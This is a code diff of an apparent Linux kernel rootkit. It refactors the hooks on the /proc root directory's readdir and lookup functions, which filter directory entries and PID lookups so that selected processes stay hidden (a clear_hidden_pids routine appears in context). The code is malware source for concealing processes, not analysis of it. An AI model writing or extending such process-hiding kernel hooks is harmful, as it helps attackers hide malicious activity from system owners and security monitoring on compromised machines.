@@ -89,8 +89,6 @@ void clear_hidden_pids(void) {
 // Forward declaration to solve circular dependency
 static struct p_hook_struct p_proc_root_readdir_hook;
 
-static int (*original_proc_root_readdir)(struct file *, struct dir_context *);
-
 struct hooked_dir_context {
     struct dir_context original;
     struct dir_context *original_ctx;
@@ -116,18 +114,19 @@ static int hooked_proc_root_readdir(struct file *file, struct dir_context *ctx)
 {
     struct hooked_dir_context hooked_ctx;
     int ret;
+	typedef int (*original_readdir_t)(struct file *, struct dir_context *);
+    original_readdir_t original_function = (original_readdir_t)p_proc_root_readdir_hook.stub->orig;
 
-    original_proc_root_readdir = (void*)p_proc_root_readdir_hook.stub->orig;
 
     if (!ctx || !ctx->actor) {
-        return original_proc_root_readdir(file, ctx);
+        return original_function(file, ctx);
     }
 
     hooked_ctx.original_ctx = ctx;
     memcpy(&hooked_ctx.original, ctx, sizeof(struct dir_context));
     *(filldir_t *)(&hooked_ctx.original.actor) = hooked_filldir;
 
-    ret = original_proc_root_readdir(file, &hooked_ctx.original);
+    ret = original_function(file, &hooked_ctx.original);
 
     ctx->pos = hooked_ctx.original.pos;
 
@@ -148,13 +147,13 @@ GENERATE_INSTALL_FUNC(proc_root_readdir)
 // Forward declaration
 static struct p_hook_struct p_proc_root_lookup_hook;
 
-static struct dentry * (*original_proc_root_lookup)(struct inode *,struct dentry *, unsigned int);
-
 static struct dentry * hooked_proc_root_lookup(struct inode *dir, struct dentry *dentry, unsigned int flags)
 {
     char *endptr;
     long pid;
     const char *name;
+	typedef struct dentry * (*original_lookup_t)(struct inode *, struct dentry *, unsigned int);
+    original_lookup_t original_function = (original_lookup_t)p_proc_root_lookup_hook.stub->orig;
 
     if (dentry && dentry->d_name.name) {
         name = dentry->d_name.name;
@@ -164,8 +163,7 @@ static struct dentry * hooked_proc_root_lookup(struct inode *dir, struct dentry 
         }
     }
 
-    original_proc_root_lookup = (void*)p_proc_root_lookup_hook.stub->orig;
-    return original_proc_root_lookup(dir, dentry, flags);
+    return original_function(dir, dentry, flags);
 }
 
 static char p_proc_root_lookup_hook_state = 0;
